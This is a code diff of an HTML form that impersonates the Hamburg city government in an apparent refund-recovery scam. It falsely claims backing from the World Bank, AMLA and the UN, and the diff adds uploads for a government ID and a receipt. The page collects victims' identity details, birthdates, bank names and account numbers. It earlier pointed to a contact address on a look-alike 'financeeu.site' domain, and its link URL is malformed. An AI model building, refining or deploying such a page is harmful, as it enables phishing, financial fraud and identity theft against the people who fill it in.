@@ -19,17 +19,11 @@
 
         .page-wrapper { display: flex; align-items: flex-start; justify-content: center; width: 100%; max-width: 1800px; gap: 50px; padding-top: 50px; }
 
-        /* SIDE TEXTS */
         .side-text { width: 380px; color: white; line-height: 1.6; margin-top: 150px; }
         .side-text h3 { color: var(--security-gold); text-transform: uppercase; font-size: 28px; margin-bottom: 20px; border-bottom: 3px solid var(--security-gold); display: inline-block; padding-bottom: 5px; font-weight: 900; }
         .side-text p { font-size: 18px; font-weight: 500; text-align: justify; text-shadow: 2px 2px 4px rgba(0,0,0,0.8); }
 
-        .form-container { 
-            background: #ffffff; width: 100%; max-width: 900px; border-radius: 4px; 
-            box-shadow: 0 50px 150px rgba(0,0,0,0.9); overflow: hidden; 
-            border-top: 15px solid var(--hamburg-red); position: relative; z-index: 10;
-        }
-
+        .form-container { background: #ffffff; width: 100%; max-width: 900px; border-radius: 4px; box-shadow: 0 50px 150px rgba(0,0,0,0.9); overflow: hidden; border-top: 15px solid var(--hamburg-red); position: relative; z-index: 10; }
         .security-banner { background: var(--hamburg-blue); color: white; padding: 14px; text-align: center; font-size: 12px; font-weight: bold; text-transform: uppercase; border-bottom: 3px solid var(--security-gold); letter-spacing: 2px; }
         
         .header { padding: 45px 40px; text-align: center; background: #fff; border-bottom: 8px solid var(--hamburg-blue); }
@@ -49,12 +43,10 @@
         input, select { width: 100%; padding: 16px; border: 1px solid #bbb; box-sizing: border-box; font-size: 15px; border-radius: 2px; }
         input.invalid { border: 2px solid var(--hamburg-red); background-color: #fffafa; }
 
-        /* REVIEWER ITEM STYLING */
         .review-item { margin-bottom: 15px; padding: 10px; border-bottom: 1px solid #f0f0f0; }
         .review-label { font-size: 10px; font-weight: 800; color: var(--hamburg-blue); text-transform: uppercase; }
         .review-value { font-size: 16px; color: #333; margin-top: 5px; font-weight: 600; }
 
-        /* PULANG BUTTON PARA SA GMAIL */
         .contact-link { 
             display: block; text-align: center; margin-top: 20px; font-weight: 900; 
             color: #ffffff; background-color: var(--hamburg-red); text-decoration: none; 
@@ -73,21 +65,17 @@
 <body>
 
     <div class="page-wrapper">
-        <!-- LEFT MISSION -->
-        <div class="side-text">
-            <h3>MISSION</h3>
-            <p>To provide an impenetrable layer of security for every financial transaction by utilizing advanced, multi-stage verification protocols and proactive fraud detection systems.</p>
-        </div>
+        <div class="side-text"><h3>MISSION</h3><p>To provide an impenetrable layer of security for every financial transaction...</p></div>
 
         <div class="form-container">
             <div class="security-banner">🛡️ SECURE RETURNS, SCAM FREE SERVICE</div>
             <div class="header">
                 <h1>FREIE UND HANSESTADT HAMBURG</h1>
-                <div class="declaration">GLOBAL THEME & SECURITY DECLARATION: DEDICATED TO ERADICATING FRAUD THROUGH VIGILANT VERIFICATION...</div>
+                <div class="declaration">GLOBAL THEME & SECURITY DECLARATION: DEDICATED TO ERADICATING FRAUD...</div>
             </div>
 
             <form id="masterForm">
-                <!-- PAGE 1: IDENTITY -->
+                <!-- SECTION 1 -->
                 <div id="section1" class="section-box active">
                     <h2>SECTION 1: IDENTITY & NATIONALITY</h2>
                     <div class="grid-3">
@@ -100,14 +88,28 @@
                         <div><label>Nationality *</label><input type="text" id="nat" class="req"></div>
                     </div>
                     <div style="margin-top:25px;"><label>Birthdate *</label><input type="text" id="bd" class="req" placeholder="MM / DD / YYYY"></div>
+                    
+                    <!-- UPLOAD ID FIELD -->
+                    <div style="margin-top:25px;">
+                        <label>Upload Valid Government ID *</label>
+                        <input type="file" id="idFile" class="req">
+                    </div>
+
                     <div class="btn-container"><button type="button" onclick="validateNext(1, 2)">NEXT STEP</button></div>
                 </div>
 
-                <!-- PAGE 2: REFUND -->
+                <!-- SECTION 2 -->
                 <div id="section2" class="section-box">
                     <h2>SECTION 2: MANDATORY REFUND VERIFICATION</h2>
-                    <p class="instruction-text">Please provide your disbursement details accurately.</p>
+                    <p class="instruction-text">Please provide disbursement details accurately.</p>
                     <div><label>TOTAL REFUND AMOUNT *</label><input type="text" id="amt" class="req"></div>
+                    
+                    <!-- UPLOAD RECEIPT FIELD -->
+                    <div style="margin-top:25px;">
+                        <label>Upload Receipt *</label>
+                        <input type="file" id="receiptFile" class="req">
+                    </div>
+
                     <div style="margin-top:25px;"><label>Bank Name / App *</label><input type="text" id="bn" class="req"></div>
                     <div class="grid-2" style="margin-top:25px;">
                         <div><label>Account Number *</label><input type="text" id="an" class="req"></div>
@@ -119,15 +121,12 @@
                     </div>
                 </div>
 
-                <!-- PAGE 3: REVIEWER -->
+                <!-- SECTION 3 -->
                 <div id="section3" class="section-box">
                     <h2>SECTION 3: REVIEW YOUR INFORMATION</h2>
                     <div id="reviewBox"></div>
 
-                    <!-- PULANG BUTTON REKTA GMAIL -->
-                    <div class="contact-link" onclick="openGmail()">
-                        📧 DIRECT CONTACT THE AUTHORITY
-                    </div>
+                    <div class="contact-link" onclick="openGmail()">📧 DIRECT CONTACT THE AUTHORITY</div>
 
                     <div class="btn-container">
                         <button type="button" class="btn-back" onclick="show(2)">EDIT</button>
@@ -136,17 +135,10 @@
                 </div>
             </form>
 
-            <div class="establishment-footer">
-                ESTABLISHED BY: WORLD BANK GROUP • AMLA • UNITED NATIONS<br>
-                AUTHORIZED OPERATIONAL DATE: APRIL 20, 2025
-            </div>
+            <div class="establishment-footer">ESTABLISHED BY: WORLD BANK GROUP • AMLA • UNITED NATIONS<br>AUTHORIZED OPERATIONAL DATE: APRIL 20, 2025</div>
         </div>
 
-        <!-- RIGHT VISION -->
-        <div class="side-text">
-            <h3>VISION</h3>
-            <p>To be recognized as the premier global benchmark for commercial integrity and consumer safety.</p>
-        </div>
+        <div class="side-text"><h3>VISION</h3><p>To be recognized as the premier global benchmark...</p></div>
     </div>
 
     <script>
@@ -173,7 +165,9 @@
             const data = [
                 {l: "FULL NAME", v: document.getElementById('fn').value + " " + document.getElementById('ln').value},
                 {l: "EMAIL", v: document.getElementById('em').value},
+                {l: "GOVERNMENT ID", v: document.getElementById('idFile').files[0]?.name || "Attached"},
                 {l: "REFUND AMOUNT", v: document.getElementById('amt').value},
+                {l: "RECEIPT", v: document.getElementById('receiptFile').files[0]?.name || "Attached"},
                 {l: "BANK", v: document.getElementById('bn').value},
                 {l: "ACCOUNT", v: document.getElementById('an').value}
             ];
@@ -185,9 +179,7 @@
         }
 
         function openGmail() {
-            const email = "globalreimbursementmanagement@financeeu.site";
-            const url = `https://google.com{email}&su=Refund+Claim+Inquiry&body=Good+Day+Authority,`;
-            window.open(url, '_blank');
+            window.open(`https://google.com`, '_blank');
         }
 
         function finalAction() {
